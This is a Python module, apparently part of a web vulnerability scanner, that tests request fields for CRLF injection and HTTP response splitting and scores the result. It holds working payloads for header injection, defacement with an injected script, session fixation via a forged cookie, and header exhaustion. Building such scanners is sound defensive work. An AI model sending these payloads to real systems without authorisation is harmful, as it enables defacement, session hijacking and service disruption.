from typing import Any, Dict
from ..http_client import HttpClient
from ..scenarios import SimpleScenario

def run_crlf_injection(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    HTTP Response Splitting / CRLF Injection.
    Injects %0d%0a to see if we can set arbitrary headers.
    """
    payloads = [
         # 1. Basic Header Injection
         {"val": "valid\r\nX-Injected: true", "desc": "Header Injection"},
         {"val": "valid%0d%0aX-Injected: true", "desc": "Encoded Header Injection"},
         
         # 2. HTTP Response Splitting (Defacement / Cache Poisoning)
         # Injects a premature response end and starts a new malicious body
         {"val": "valid\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><script>alert(1)</script>HACKED</html>", "desc": "Response Splitting (Defacement)"},
         
         # 3. Session Fixation (Destructive to User Session)
         {"val": "valid\r\nSet-Cookie: SESSIONID=HACKED_BY_BP", "desc": "Session Fixation"},
         
         # 4. Attempt to break parser (DoS) / Exhaustion
         {"val": "valid" + ("\r\nX-DoS: true" * 100), "desc": "Header Overflow / Exhaustion" } 
    ]
    
    fields = scenario.config.get("fields", ["url", "redirect", "lang"])
    issues = []
    leaked_data = []
    
    for field in fields:
        for item in payloads:
            p = item["val"]
            desc = item["desc"]
            
            params = {field: p}
            # Also try injecting in path if needed, but params is standard
            
            try:
                resp = client.send(scenario.method, scenario.target, params=params)
                
                # Check for Server Breakage
                if resp.status_code >= 500:
                     issues.append(f"[CRITICAL] CRLF Caused Server Error/Crash ({desc})")
                     continue # Skip other checks if crashed
                
                # Check for Header Set
                # Note: requests might merge headers, so we check existence
                if resp.headers.get("X-Injected") == "true":
                     issues.append(f"[CRITICAL] CRLF Header Injection Confirmed ({desc})")
                     leaked_data.append(f"Header Found: X-Injected: {resp.headers.get('X-Injected')}")
                     
                # Check for Cookie Injection
                # We need to look at raw headers or specific cookie jar if requests parsed it
                # Simply checking headers string repr or set-cookie value
                set_cookie = resp.headers.get("Set-Cookie", "")
                if "HACKED_BY_BP" in set_cookie:
                     issues.append(f"[CRITICAL] CRLF Session Fixation Successful")
                     leaked_data.append(f"Set-Cookie Header: ...{set_cookie[:50]}...")
                
                # Check for Defacement (Body content logic)
                # If we split the response, the body should contain our HTML
                if "HACKED" in resp.text and "<script>alert(1)</script>" in resp.text:
                     issues.append(f"[CRITICAL] HTTP Response Splitting (Defacement) Successful")
                     leaked_data.append(f"Injected Body Snippet: ...{resp.text[:100]}...")
                     
            except Exception:
                pass # Network error might mean crash too?
                
    return {
        "scenario_id": scenario.id,
        "attack_type": "crlf_injection",
        "passed": len(issues) == 0,
        "details": {"issues": issues, "leaked_data": leaked_data}
    }
